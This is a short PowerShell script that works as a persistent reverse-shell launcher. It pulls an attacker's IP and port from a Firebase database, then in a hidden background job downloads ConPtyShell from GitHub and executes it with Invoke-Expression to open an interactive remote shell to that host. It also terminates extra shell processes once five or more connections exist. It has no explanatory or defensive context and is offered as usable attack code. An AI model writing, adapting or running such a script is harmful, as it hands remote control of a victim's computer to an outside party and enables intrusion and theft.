$ip = Invoke-RestMethod -Uri "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/data/website/ip.json"
$port = Invoke-RestMethod -Uri "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/data/website/port.json"

$owningProcesses = @(Get-NetTCPConnection | Where-Object { $_.RemoteAddress -eq $ip -and $_.RemotePort -eq $port } | Select-Object -ExpandProperty OwningProcess)
[System.Array]::Reverse($owningProcesses)
$firstProcess = $owningProcesses[0]
Write-Host "First Owning Process: $firstProcess"
Write-Host "Owning Processes: $owningProcesses"

Start-Job {
    $ip="$(Invoke-RestMethod -Uri https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/data/website/ip.json)"
    $port="$(Invoke-RestMethod -Uri https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/data/website/port.json)"

    IEX(
        IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing
    )

    Invoke-ConPtyShell "$ip" "$port"
} | Out-Null

if ($owningProcesses.Length -ge 5) {
    for ($i = 1; $i -lt $owningProcesses.Length; $i++) {
        Stop-Process -Id $owningProcesses[$i]
    }
}